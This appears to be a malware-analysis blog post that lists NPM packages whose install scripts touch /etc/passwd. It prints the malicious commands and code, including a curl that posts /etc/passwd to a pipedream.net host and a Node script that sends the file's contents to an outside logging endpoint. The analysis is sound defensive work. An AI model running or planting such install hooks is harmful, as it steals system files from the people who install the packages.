---
title: "NPM malware results, Oct 4, 2023"
date: 2023-10-04T00:00:00-07:00
tags:
  - malware-analysis
  - javascript
  - npm
---

Reviewing pre- and postinstall scripts for NPM packages.

References to `passwd`:

| package                    | version | preinstall                                                                      | postinstall                                                               |
|----------------------------|---------|---------------------------------------------------------------------------------|---------------------------------------------------------------------------|
| cat-etc-passwd             | 1.0.2   |                                                                                 | `node index.js`                                                             |
| cat-etc-passwd             | 1.0.3   |                                                                                 | `node index.js`                                                             |
| cat-etc-passwd             | 1.0.4   |                                                                                 | `node index.js`                                                             |
| securisecidonothing        | 1.0.2   | `cat /etc/passwd`                                                                 |                                                                           |
| sophs-test-package         | 1.7.6   | `blah /etc/passwd blah`                                                           |                                                                           |
| peekatchuysharmlesspackage | 1.0.15  | `touch ../../evil`                                                                | `brave https://www.youtube.com/watch?v=dQw4w9WgXcQ?autplay=1 && cat /etc/…` |
| peekatchuysharmlesspackage | 1.0.16  | `touch ../../evil`                                                                | `brave https://www.youtube.com/watch?v=dQw4w9WgXcQ?autplay=1 && cat /etc/…` |
| peekatchuysharmlesspackage | 1.0.17  | `touch ../../evil`                                                                | `brave https://www.youtube.com/watch?v=dQw4w9WgXcQ?autplay=1 && cat /etc/…` |
| lenskart                   | 1.0.5   | `/usr/bin/curl --data '@/etc/passwd' $(hostname).eo2z7l1ydft6861.m.pipedream.net` |                                                                           |
| lenskart                   | 1.0.6   | `/usr/bin/curl --data '@/etc/passwd' $(hostname).eo2z7l1ydft6861.m.pipedream.net` |                                                                           |



## cat-etc-passwd@1.0.4

`/index.js`

```js
const { exec } = require('child_process');
const fetch = require('node-fetch');

exec('cat /etc/passwd', (error, stdout, stderr) => {
  if (error) {
    console.error(`exec error: ${error}`);
    return;
  }

  fetch('https://us-central1-xenon-shard-259622.cloudfunctions.net/http-request-logger', {
    method: 'POST',
    body: `
      stdout:

      ${stdout}

      stderr:

      ${stderr}
    `
  });
});
```
